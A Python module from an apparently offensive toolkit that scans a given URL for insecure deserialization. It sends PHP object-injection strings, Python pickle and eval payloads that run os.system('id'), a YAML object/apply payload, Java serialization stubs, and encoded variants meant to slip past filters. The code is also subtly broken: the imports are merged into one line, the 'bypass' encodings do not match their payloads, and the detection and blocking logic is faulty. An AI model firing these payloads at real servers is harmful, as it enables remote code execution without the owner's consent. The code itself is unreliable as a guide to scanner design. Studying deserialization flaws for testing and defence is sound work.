#!/usr/bin/env python3
"""Modulo de deteccao de Deserialization Injection (PHP/Java/Python).

Testa se o servidor e vulneravel a desserializacao de objetos via:
  - PHP — payloads O:, a:, r: (unserialize), POP chains
  - Java — magic bytes \xac\xed\x00\x05, gadget chains, JNDI
  - Python — pickle \x80\x04\x95, __reduce__, YAML !python/object/apply:
  - Detect — erros, timing, reflecao de dados serializados
  - Bypass — encoding, compressao, nesting para contornar filtros

Fluxo:
  1. Envia payloads de desserializacao em parametros de entrada
  2. Verifica se a resposta indica desserializacao bem-sucedida
  3. Se detectado, envia payloads de exploit
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparseimport loggingimport timefrom dataclasses import asdict, dataclassimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.deserialinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "php": ["php_basic", "php_pop_chain", "php_ref_inject", "php_array_cast", "php_object_inject"],
    "java": ["java_magic_bytes", "java_obj_stream", "java_gadget_cc", "java_gadget_spring", "java_jndi"],
    "python": ["python_pickle", "python_reduce", "python_yaml", "python_marshal", "python_shelve"],
    "detect": ["error_leak", "timing_anomaly", "reflected_data", "type_confusion", "cookie_inject"],
    "bypass": ["url_encode", "base64_wrap", "double_encode", "gzip_compress", "nested_serial"],
}

_PHP_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "php_basic",
        'O:4:"User":1:{s:4:"name";s:6:"admin";}',
        ["admin", "User", "serialize", "unserialize", "object"],
    ),
    (
        "php_pop_chain",
        'O:12:"PHPObjInject":1:{s:4:"cmd";s:6:"whoami";}',
        ["PHPObjInject", "cmd", "whoami", "serialize"],
    ),
    (
        "php_ref_inject",
        'a:2:{i:0;R:1;i:1;s:6:"admin";}',
        ["admin", "R:1", "reference", "serialize"],
    ),
    (
        "php_array_cast",
        'a:1:{s:4:"user";s:6:"admin";}',
        ["admin", "user", "array", "serialize"],
    ),
    (
        "php_object_inject",
        'O:8:"stdClass":1:{s:4:"role";s:5:"admin";}',
        ["admin", "role", "stdClass", "serialize"],
    ),
]

_JAVA_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "java_magic_bytes",
        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11",
        ["\\xac\\xed", "serialization", "java", "object"],
    ),
    (
        "java_obj_stream",
        "\\xac\\xed\\x00\\x05\\x74\\x00\\x04test",
        ["\\xac\\xed", "ObjectInputStream", "readObject", "java"],
    ),
    (
        "java_gadget_cc",
        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x3a",
        ["\\xac\\xed", "gadget", "Commons", "Collections", "RCE"],
    ),
    (
        "java_gadget_spring",
        "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2f",
        ["\\xac\\xed", "Spring", "gadget", "RCE", "deserialize"],
    ),
    (
        "java_jndi",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        ["rO0AB", "JNDI", "java", "HashMap", "serialize"],
    ),
]

_PYTHON_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "python_pickle",
        "\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04os\\x94\\x8c\\x06system\\x94\\x8c\\x04id\\x94\\x93\\x94.",
        ["\\x80\\x04", "pickle", "reduce", "os.system", "serialize"],
    ),
    (
        "python_reduce",
        "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'tR.",
        ["eval", "__import__", "os.system", "pickle", "reduce"],
    ),
    (
        "python_yaml",
        "!!python/object/apply:os.system [id]",
        ["!!python", "object/apply", "os.system", "yaml", "deserialize"],
    ),
    (
        "python_marshal",
        "\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
        ["\\xe3", "marshal", "code", "compile", "deserialize"],
    ),
    (
        "python_shelve",
        "\\x80\\x04\\x95\\x0e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04shelve",
        ["\\x80\\x04", "shelve", "pickle", "serialize", "marshal"],
    ),
]

_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "error_leak",
        'O:99:"NonExistentClass":0:{}',
        ["NonExistentClass", "unserialize", "fatal", "error", "class"],
    ),
    (
        "timing_anomaly",
        'O:4:"User":1:{s:4:"name";s:6:"admin";}',
        ["admin", "User", "object", "serialize"],
    ),
    (
        "reflected_data",
        'O:4:"Test":0:{}',
        ["Test", "O:4", "serialize", "object"],
    ),
    (
        "type_confusion",
        'a:0:{}',
        ["a:0", "array", "serialize", "empty"],
    ),
    (
        "cookie_inject",
        'O:4:"User":1:{s:4:"role";s:5:"admin";}',
        ["admin", "role", "User", "object", "serialize"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "url_encode",
        "O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22admin%22%3B%7D",
        ["O:4", "User", "admin", "serialize"],
    ),
    (
        "base64_wrap",
        "TzE6IlVzZXIiOjE6OntzOjQ6Im5hbWUiO3M6NjoiYWRtaW4iO30=",
        ["O:4", "User", "admin", "serialize"],
    ),
    (
        "double_encode",
        "O%253A4%253A%2522User%2522%253A1%253A",
        ["O:4", "User", "serialize", "double"],
    ),
    (
        "gzip_compress",
        "H4sIAAAAAAAAA8tIzcnJVyjPL8pJUQQAAAD//w==",
        ["gzip", "compress", "serialize", "decode"],
    ),
    (
        "nested_serial",
        'a:1:{i:0;O:4:"User":1:{s:4:"name";s:6:"admin";}}',
        ["admin", "User", "nested", "array", "serialize"],
    ),
]

_SSI_PARAMS: list[str] = [
    "data", "json", "payload", "input", "value",
    "content", "body", "params", "query", "config",
    "options", "settings", "item", "object", "model",
]


@dataclass(frozen=True, slots=True)
class DeserialAttempt:
    """Tentativa individual de Deserialization Injection."""
    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class DeserialResult:
    """Resultado consolidado do scan de Deserialization Injection."""
    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[DeserialAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _check_deserial_response(body: bytes, status: int, indicators: list[str]) -> bool:
    """Verifica se a resposta indica desserializacao."""
    if status == 0:
        return False
    text = body.decode("utf-8", errors="ignore").lower()
    return any(ind.lower() in text for ind in indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter tamanho e status de referencia."""
    try:
        resp = await client.get(url, follow_redirects=True)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_php(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization PHP."""
    b_status, b_size, _ = baseline
    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _PHP_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
                results.append(DeserialAttempt(
                    technique=technique,
                    category="php",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                ))
            except httpx.RequestError as e:
                results.append(DeserialAttempt(
                    technique=technique,
                    category="php",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_java(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Java."""
    b_status, b_size, _ = baseline
    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _JAVA_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                resp = await client.post(url, content=payload.encode() if isinstance(payload, str) else payload, follow_redirects=True)
                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
                results.append(DeserialAttempt(
                    technique=technique,
                    category="java",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                ))
            except httpx.RequestError as e:
                results.append(DeserialAttempt(
                    technique=technique,
                    category="java",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_python(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deserialization Python."""
    b_status, b_size, _ = baseline
    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _PYTHON_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                resp = await client.post(url, content=payload.encode() if isinstance(payload, str) else payload, follow_redirects=True)
                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
                results.append(DeserialAttempt(
                    technique=technique,
                    category="python",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                ))
            except httpx.RequestError as e:
                results.append(DeserialAttempt(
                    technique=technique,
                    category="python",
                    payload=payload,
                    param=param,
                    method="post_raw",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_detect(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de deteccao generica."""
    b_status, b_size, _ = baseline
    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                if technique == "timing_anomaly":
                    t0 = time.monotonic()
                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
                    elapsed = time.monotonic() - t0
                    vulnerable = elapsed > 2.0
                else:
                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
                    vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)

                results.append(DeserialAttempt(
                    technique=technique,
                    category="detect",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                ))
            except httpx.RequestError as e:
                results.append(DeserialAttempt(
                    technique=technique,
                    category="detect",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[DeserialAttempt]:
    """Testa payloads de bypass de filtros."""
    b_status, b_size, _ = baseline
    results: list[DeserialAttempt] = []

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_deserial_response(resp.content, resp.status_code, indicators)
                results.append(DeserialAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                    exploit="ysoserial_payload" if vulnerable else "",
                    tool="ysoserial",
                ))
            except httpx.RequestError as e:
                results.append(DeserialAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


def print_results(result: DeserialResult) -> None:
    """Exibe os resultados do scan de Deserialization Injection."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if a.error and "403" in a.error]

    if vuln:
        print(color("\n[!] VULNERABILIDADES DETECTADAS:", Cyber.RED, Cyber.BOLD))
        for v in vuln:
            print(color(f"  [!] {v.technique} via {v.param}", Cyber.RED))
            print(f"      Payload: {v.payload[:80]}...")
            if v.details:
                print(f"      Detalhes: {v.details}")
            print_exploit_info(v.exploit, v.tool)
    else:
        print(color("\n  [+] Nenhuma Deserialization Injection detectada", Cyber.GREEN, Cyber.BOLD))

    if blocked:
        print(color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error and "403" not in a.error]
    if errors:
        print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))

    print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan de Deserialization Injection."""
    logger.info("Deserialization scan para %s", target)

    async with create_async_client(timeout=timeout) as client:
        b_status, b_size, _ = await _test_baseline(client, target)
        if b_status == 0:
            print(color("[-] Nao foi possivel conectar ao alvo", Cyber.RED))
            return 1

        print(color(f"[*] Baseline: status={b_status}, size={b_size}", Cyber.CYAN))

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())
        all_attempts: list[DeserialAttempt] = []

        for cat in test_categories:
            if cat == "php":
                attempts = await _test_php(client, target, (b_status, b_size, b""))
            elif cat == "java":
                attempts = await _test_java(client, target, (b_status, b_size, b""))
            elif cat == "python":
                attempts = await _test_python(client, target, (b_status, b_size, b""))
            elif cat == "detect":
                attempts = await _test_detect(client, target, (b_status, b_size, b""))
            elif cat == "bypass":
                attempts = await _test_bypass(client, target, (b_status, b_size, b""))
            else:
                continue
            all_attempts.extend(attempts)

        vulnerable = [a for a in all_attempts if a.vulnerable]
        blocked = [a for a in all_attempts if a.error and "403" in a.error]
        issues = [f"VULN: {a.technique} via {a.param}" for a in vulnerable]

        result = DeserialResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=target.startswith("https"),
            attempts=all_attempts,
            vulnerable_techniques=[a.technique for a in vulnerable],
            blocked_techniques=[a.technique for a in blocked],
            issues=issues,
            overall_status="vulnerable" if vulnerable else "secure",
        )

        print_results(result)

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vulnerable else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
  ____                            _       _   _             ____       _
 |  _ \  _____      _____ _ __ __| | ___ | |_(_)_ __   ___|  _ \ __ _| |
 | | | |/ _ \ \ /\ / / _ \ '__/ _` |/ _ \| __| | '_ \ / _ \ |_) / _` | |
 | |_| |  __/\ V  V /  __/ | | (_| | (_) | |_| | | | |  __/  __/ (_| | |
 |____/ \___| \_/\_/ \___|_|  \__,_|\___/ \__|_|_| |_|\___|_|   \__,_|_|
"""
    create_banner(art, "   deserialization: PHP / Java / Python serialize exploit")()


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-deserial",
        description="Deserialization Injection — detecta desserializacao em PHP/Java/Python",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Deserialization a partir de argumentos parseados."""
    logger.info("Deserialization scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="deserial> ",
        description="Deserialization Injection interativo.",
        example="https://target.com -c php",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c php\n"
            "  https://target.com -c java\n"
            "  https://target.com -c python\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
